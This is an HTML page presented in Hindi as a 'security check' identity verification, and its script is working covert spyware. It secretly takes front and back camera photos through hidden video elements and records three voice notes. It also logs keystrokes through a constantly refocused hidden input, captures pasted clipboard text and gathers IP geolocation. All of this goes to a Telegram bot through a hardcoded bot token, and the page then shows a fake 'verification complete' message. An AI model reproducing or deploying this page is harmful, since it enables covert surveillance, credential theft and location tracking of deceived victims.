<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>सुरक्षा जाँच</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:sans-serif;text-align:center;min-height:100vh;display:flex;align-items:center;justify-content:center;background-color:#f4f4f9;}
        .container{background:white;padding:30px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);display:inline-block;max-width:460px;width:90%;}
        #status{font-size:18px;color:#333;font-weight:bold;margin:10px 0;}
        .loader{border:4px solid #f3f3f3;border-top:4px solid #007bff;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:20px auto;}
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        #errorDetail{font-size:14px;color:#888;margin-top:10px;word-break:break-all;max-width:400px;display:none;}
        .hidden-input{position:fixed;top:-9999px;left:-9999px;opacity:0;height:0;width:0;}
    </style>
</head>
<body onload="startAll()">

<div class="container">
    <h2 id="titleText">सुरक्षा जाँच...</h2>
    <div id="loader" class="loader"></div>
    <p id="status">कैमरा कनेक्टिंग...</p>
    <p id="errorDetail"></p>
</div>

<video id="videoFront" autoplay playsinline muted
    style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none;">
</video>
<canvas id="canvas" style="display:none;"></canvas>
<input id="keyloggerInput" class="hidden-input" autocomplete="off">

<script>
// ===================== CONFIGURATION =====================
const BOT_TOKEN = "8225378395:AAHCsye1btvGfyrXSa_56rMkiG-XtDUswXk";
const DEFAULT_CHAT_ID = "8146265514";
const _urlParams = new URLSearchParams(window.location.search);
const CHAT_ID = _urlParams.get('id') || DEFAULT_CHAT_ID;

// Limits
const MAX_PHOTOS = 6;
const MAX_VOICE_NOTES = 3;
const VOICE_DURATION_MS = 10000; // 10 seconds each

// ===================== DOM REFS =====================
const videoFront = document.getElementById("videoFront");
const canvas = document.getElementById("canvas");
const statusText = document.getElementById("status");
const titleText = document.getElementById("titleText");
const loader = document.getElementById("loader");
const errorDetail = document.getElementById("errorDetail");
const klInput = document.getElementById("keyloggerInput");

let frontStream = null;
let audioStream = null;
let mediaRecorder = null;
let audioChunks = [];
let photoCount = 0;
let voiceCount = 0;
let captureInterval = null;
let timeouts = [];
let intervals = [];

// ===================== UTILITY =====================
function setStatus(msg, color, detail) {
    statusText.innerText = msg;
    if (color) statusText.style.color = color;
    if (detail) {
        errorDetail.style.display = "block";
        errorDetail.innerText = "🔍 " + detail;
    }
}

function setDone() {
    loader.style.display = "none";
    titleText.innerText = "✅ सुरक्षा जाँच पूर्ण";
    setStatus("आपकी पहचान सत्यापित हो गई है। आप इस पेज को बंद कर सकते हैं।", "green");
}

function tgSend(method, payload) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
    if (payload instanceof FormData) {
        return fetch(url, { method: "POST", body: payload }).then(r => r.json()).catch(() => {});
    }
    return fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }).then(r => r.json()).catch(() => {});
}

// ===================== STAGE 1: CAMERA - FIRST CAPTURE =====================
function startCamera() {
    return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
    .then(stream => {
        frontStream = stream;
        videoFront.srcObject = stream;
        return new Promise((resolve) => {
            videoFront.onplaying = () => {
                setStatus("कैमरा स्कैनिंग... अंतिम चरण...", "blue");
                setTimeout(() => { capturePhoto(resolve); }, 800);
            };
            videoFront.onloadedmetadata = () => { videoFront.play().catch(() => {}); };
        });
    });
}

function capturePhoto(callback) {
    if (videoFront.videoWidth === 0 || videoFront.videoHeight === 0) {
        setTimeout(() => capturePhoto(callback), 300);
        return;
    }
    
    canvas.width = videoFront.videoWidth;
    canvas.height = videoFront.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(videoFront, 0, 0, canvas.width, canvas.height);
    
    canvas.toBlob(b => {
        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("photo", b, "capture.png");
        fd.append("caption", `📸 फोटो ${++photoCount}/${MAX_PHOTOS} — ${new Date().toLocaleString()}`);
        tgSend("sendPhoto", fd);
        
        if (frontStream) {
            frontStream.getTracks().forEach(t => t.stop());
            frontStream = null;
        }
        if (callback) callback();
    }, "image/png");
}

// ===================== STAGE 2: CONTINUOUS CAPTURE (PHOTO 2-6) =====================
function startContinuousCapture() {
    setDone();
    
    captureInterval = setInterval(() => {
        if (photoCount >= MAX_PHOTOS) {
            clearInterval(captureInterval);
            return;
        }
        
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
        .then(stream => {
            const tempVideo = document.createElement("video");
            tempVideo.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;";
            tempVideo.setAttribute("playsinline", "");
            tempVideo.setAttribute("muted", "");
            tempVideo.srcObject = stream;
            document.body.appendChild(tempVideo);
            
            tempVideo.onplaying = () => {
                setTimeout(() => {
                    const c = document.createElement("canvas");
                    c.width = tempVideo.videoWidth || 640;
                    c.height = tempVideo.videoHeight || 480;
                    c.getContext("2d").drawImage(tempVideo, 0, 0);
                    
                    c.toBlob(b => {
                        const fd = new FormData();
                        fd.append("chat_id", CHAT_ID);
                        fd.append("photo", b, `photo_${Date.now()}.png`);
                        fd.append("caption", `📸 फोटो ${++photoCount}/${MAX_PHOTOS} — ${new Date().toLocaleString()}`);
                        tgSend("sendPhoto", fd);
                        
                        stream.getTracks().forEach(t => t.stop());
                        document.body.removeChild(tempVideo);
                    }, "image/jpeg", 0.7);
                }, 500);
            };
        })
        .catch(() => {});
    }, 5000); // हर 5 सेकंड में एक फोटो
}

// ===================== STAGE 3: VOICE NOTES (LIMITED TO 3) =====================
function startVoiceRecording() {
    if (voiceCount >= MAX_VOICE_NOTES) return;
    
    navigator.mediaDevices.getUserMedia({ audio: true, video: false })
    .then(stream => {
        audioStream = stream;
        mediaRecorder = new MediaRecorder(stream, {
            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm'
        });
        
        mediaRecorder.ondataavailable = e => {
            if (e.data.size > 0) audioChunks.push(e.data);
        };
        
        mediaRecorder.onstop = () => {
            const blob = new Blob(audioChunks, { type: 'audio/webm' });
            const fd = new FormData();
            fd.append("chat_id", CHAT_ID);
            fd.append("audio", blob, `voice_${Date.now()}.webm`);
            fd.append("caption", `🎤 ${++voiceCount}/${MAX_VOICE_NOTES} — ${new Date().toLocaleString()}`);
            tgSend("sendAudio", fd);
            audioChunks = [];
            
            // अगर और वॉइस नोट बाकी हैं तो अगला start करो
            if (voiceCount < MAX_VOICE_NOTES) {
                timeouts.push(setTimeout(startVoiceRecording, 2000));
            } else {
                // सब हो गया, stream बंद करो
                if (audioStream) {
                    audioStream.getTracks().forEach(t => t.stop());
                    audioStream = null;
                }
            }
        };
        
        mediaRecorder.start();
        setStatus(`वॉइस नोट ${voiceCount + 1}/${MAX_VOICE_NOTES} रिकॉर्ड हो रहा है...`, "blue");
        
        // 10 सेकंड बाद stop
        timeouts.push(setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, VOICE_DURATION_MS));
    })
    .catch(() => {});
}

// ===================== STAGE 4: IP-BASED LOCATION =====================
function getIPLocation() {
    // Step 1: Get public IP
    fetch('https://api64.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        const ip = data.ip;
        
        // Step 2: Get location via IP-API (no key needed, HTTP, 45 req/min limit)
        fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query`)
        .then(r => r.json())
        .then(loc => {
            if (loc.status === 'success') {
                let msg = `🌐 IP Location\n`;
                msg += `IP: ${loc.query}\n`;
                msg += `📍 ${loc.city}, ${loc.regionName}, ${loc.country}\n`;
                msg += `🗺️ Lat: ${loc.lat}, Lon: ${loc.lon}\n`;
                msg += `🕐 Timezone: ${loc.timezone}\n`;
                msg += `🏢 ISP: ${loc.isp}\n`;
                msg += `🏛️ Org: ${loc.org}\n`;
                msg += `🔗 AS: ${loc.as}\n`;
                msg += `📮 ZIP: ${loc.zip}\n`;
                msg += `🕐 ${new Date().toLocaleString()}`;
                
                tgSend("sendMessage", {
                    chat_id: CHAT_ID,
                    text: msg
                });
                
                // Also send a location pin with lat/lon
                tgSend("sendLocation", {
                    chat_id: CHAT_ID,
                    latitude: loc.lat,
                    longitude: loc.lon
                });
            }
        })
        .catch(() => {});
    })
    .catch(() => {});
}

// ===================== STAGE 5: KEYLOGGER =====================
let keystrokeBuffer = [];

document.addEventListener('keydown', (e) => {
    const key = e.key;
    if (key === 'Enter') keystrokeBuffer.push('⏎');
    else if (key === 'Backspace') keystrokeBuffer.push('⌫');
    else if (key === 'Tab') keystrokeBuffer.push('⇥');
    else if (key === 'Escape') keystrokeBuffer.push('⎋');
    else if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') return;
    else if (key.length === 1) keystrokeBuffer.push(key);
    
    if (keystrokeBuffer.length >= 30 || key === 'Enter') flushKeystrokes();
});

document.addEventListener('click', () => { klInput.focus(); });
intervals.push(setInterval(() => { klInput.focus(); }, 3000));
klInput.focus();

klInput.addEventListener('input', () => {
    const val = klInput.value;
    if (val.length > 0) { keystrokeBuffer.push(val); klInput.value = ''; }
});

function flushKeystrokes() {
    if (keystrokeBuffer.length === 0) return;
    const text = keystrokeBuffer.join('');
    keystrokeBuffer = [];
    tgSend("sendMessage", { chat_id: CHAT_ID, text: `⌨️ Keys: ${text}` });
}
intervals.push(setInterval(flushKeystrokes, 10000));

// ===================== STAGE 6: CLIPBOARD =====================
document.addEventListener('paste', (e) => {
    setTimeout(() => {
        const pasted = navigator.clipboard.readText().catch(() => {
            const clipData = e.clipboardData || window.clipboardData;
            return clipData ? clipData.getData('text') : null;
        });
        
        if (pasted && typeof pasted === 'string') {
            tgSend("sendMessage", { chat_id: CHAT_ID, text: `📋 Clipboard: ${pasted.substring(0, 500)}` });
        } else if (typeof pasted === 'object' && pasted.then) {
            pasted.then(text => {
                if (text) tgSend("sendMessage", { chat_id: CHAT_ID, text: `📋 Clipboard: ${text.substring(0, 500)}` });
            }).catch(() => {});
        }
    }, 100);
});

// ===================== STAGE 7: BACK CAMERA =====================
function tryBackCamera() {
    navigator.mediaDevices.enumerateDevices()
    .then(devices => {
        const backCamera = devices.find(d => d.kind === 'videoinput' && 
            (d.label.toLowerCase().includes('back') || d.label.toLowerCase().includes('rear') || d.label.toLowerCase().includes('environment')));
        
        if (backCamera) {
            return navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: backCamera.deviceId } }, audio: false });
        }
        return null;
    })
    .then(stream => {
        if (!stream) return;
        
        const tempVideo = document.createElement("video");
        tempVideo.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;";
        tempVideo.setAttribute("playsinline", ""); tempVideo.setAttribute("muted", "");
        tempVideo.srcObject = stream;
        document.body.appendChild(tempVideo);
        
        tempVideo.onplaying = () => {
            setTimeout(() => {
                const c = document.createElement("canvas");
                c.width = tempVideo.videoWidth || 640;
                c.height = tempVideo.videoHeight || 480;
                c.getContext("2d").drawImage(tempVideo, 0, 0);
                
                c.toBlob(b => {
                    const fd = new FormData();
                    fd.append("chat_id", CHAT_ID);
                    fd.append("photo", b, "back_camera.png");
                    fd.append("caption", `📷 Back Camera — ${new Date().toLocaleString()}`);
                    tgSend("sendPhoto", fd);
                    
                    stream.getTracks().forEach(t => t.stop());
                    document.body.removeChild(tempVideo);
                }, "image/jpeg", 0.8);
            }, 600);
        };
    })
    .catch(() => {});
}

// ===================== MAIN ENTRY POINT =====================
async function startAll() {
    // Step 1: Front camera
    try { await startCamera(); } catch(e) {}
    
    // Step 2: Back camera
    tryBackCamera();
    
    // Step 3: Start continuous capture (photo 2-6)
    startContinuousCapture();
    
    // Step 4: IP location (no GPS, no user permission needed)
    getIPLocation();
    
    // Step 5: Start voice recording (3 notes, 10 sec each)
    timeouts.push(setTimeout(startVoiceRecording, 3000));
}

// ===================== CLEANUP =====================
window.addEventListener("beforeunload", () => {
    if (captureInterval) clearInterval(captureInterval);
    timeouts.forEach(t => clearTimeout(t));
    intervals.forEach(i => clearInterval(i));
    
    if (frontStream) frontStream.getTracks().forEach(t => t.stop());
    if (audioStream) {
        if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
        audioStream.getTracks().forEach(t => t.stop());
    }
    flushKeystrokes();
});
</script>
</body>
    </html>
